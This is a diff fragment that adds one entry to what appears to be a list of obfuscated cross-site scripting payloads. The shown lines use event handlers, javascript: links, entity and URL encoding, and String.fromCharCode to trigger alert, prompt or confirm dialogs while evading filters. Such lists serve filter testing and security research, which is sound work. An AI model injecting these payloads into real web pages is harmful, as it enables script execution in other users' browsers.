@@ -1,4 +1,5 @@
 <dETAILS%0aopen%0aonToGgle%0a%3d%0aa%3dprompt,a(origin)%20x>
+<A %252F=""Href=JavaScript:k='a',top[k%2B'lert'](1)>
 %3cSvg%20Only%3d1%20OnLoad%3dconfirm(1)%3e
 #"></div><a href=javascript&colon;alert&lpar;document&period;domain)
 eval.bind()(String.fromCharCode(...[97,108,101,114,116,40,41]))
